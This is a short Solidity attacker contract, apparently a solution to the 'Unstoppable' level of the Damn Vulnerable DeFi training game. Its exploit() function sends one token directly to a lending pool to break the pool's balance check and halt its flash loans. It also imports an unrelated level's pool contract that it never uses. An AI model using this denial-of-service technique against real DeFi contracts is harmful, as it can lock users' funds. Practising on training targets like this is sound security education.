pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "contracts/naive-receiver/NaiveReceiverLenderPool.sol";

contract UnstoppableAttacker {
    using Address for address payable;
    IERC20 public immutable damnValuableToken;

    constructor(address tokenAddress) {
        require(tokenAddress != address(0), "Token address cannot be zero");
        damnValuableToken = IERC20(tokenAddress);
    }

    function exploit(address target) external {
        damnValuableToken.transfer(target, 1);
    }
}
